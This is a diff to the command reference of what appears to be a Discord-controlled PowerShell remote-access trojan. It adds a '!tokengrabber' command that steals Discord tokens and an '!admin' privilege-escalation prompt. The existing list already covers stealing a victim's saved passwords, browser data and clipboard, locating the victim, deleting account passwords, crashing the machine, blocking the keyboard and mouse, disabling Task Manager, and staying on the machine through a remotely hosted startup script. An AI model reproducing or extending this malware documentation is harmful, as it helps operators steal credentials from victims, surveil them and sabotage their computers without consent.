@@ -163,65 +163,71 @@ E          X          A          M          P          L          E          S
 27. !passwords          // Retrieves the victim's saved passwords
     Example: !passwords
 
-28. !browserdata       // Retrieves browser data
+28. !tokengrabber       //Retrieves discord tokens
+    Example: !tokengrabber
+
+29. !browserdata       // Retrieves browser data
     Example: !browserdata
 
-29. !networkscan       // Scans and retrieves information about the network
+30. !networkscan       // Scans and retrieves information about the network
     Example: !networkscan
 
-30. !volume            // Adjusts the volume of the victim's computer
+31. !volume            // Adjusts the volume of the victim's computer
     Example: !volume 50
 
-31. !voice             // Makes the victim's computer speak a specified message
+32. !voice             // Makes the victim's computer speak a specified message
     Example: !voice You are hacked!
 
-32. !proclist       // Retrieves a list of all running processes
+33. !proclist       // Retrieves a list of all running processes
     Example: !proclist
 
-33. !prockill          // Terminates a specified process
+34. !prockill          // Terminates a specified process
     Example: !prockill process_name.exe
 
-34. !write             // Types a specified message
+35. !write             // Types a specified message
     Example: !write Hello, world!
 
-35. !clipboard         // Retrieves the last copied item
+36. !clipboard         // Retrieves the last copied item
     Example: !clipboard
 
-36. !idletime          // Retrieves the duration of the victim's idle time in seconds
+37. !idletime          // Retrieves the duration of the victim's idle time in seconds
     Example: !idletime
 
-37. !datetime          // Retrieves the date and time of the victim's computer
+38. !datetime          // Retrieves the date and time of the victim's computer
     Example: !datetime
 
-38. !bluescreen        // Triggers a blue screen on the victim's computer
+39. !bluescreen        // Triggers a blue screen on the victim's computer
     Example: !bluescreen
 
-39. !delpasswords      // Deletes all passwords for all accounts on the current computer
+40. !delpasswords      // Deletes all passwords for all accounts on the current computer
     Example: !delpasswords
 
-40. !geolocate         // Retrieves the victim's geolocation data
+41. !geolocate         // Retrieves the victim's geolocation data
     Example: !geolocate
 
-41. !block             // Blocks the victim's keyboard and mouse (requires admin)
+42. !block             // Blocks the victim's keyboard and mouse (requires admin)
     Example: !block
 
-42. !unblock           // Unblocks the victim's keyboard and mouse (requires admin)
+43. !unblock           // Unblocks the victim's keyboard and mouse (requires admin)
     Example: !unblock
 
-43. !disabletaskmgr    // Disables Task Manager (requires admin)
+44. !disabletaskmgr    // Disables Task Manager (requires admin)
     Example: !disabletaskmgr
 
-44. !enabletaskmgr     // Enables Task Manager (requires admin)
+45. !enabletaskmgr     // Enables Task Manager (requires admin)
     Example: !enabletaskmgr
 
-45. !startup           // Enables persistence for this script
+46. !admin             //attempts to replace session with admin (shows prompt)
+    Example: !admin
+
+47. !startup           // Enables persistence for this script
         will add a ps1 script to startup
         on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
     Example: !startup
 
-46. !implode           // Triggers a system implosion (Use with caution!)
+48. !implode           // Triggers a system implosion (Use with caution!)
     Example: !implode
 
-47. !help              // Displays information about available commands
+49. !help              // Displays information about available commands
     Example: !help
 ```
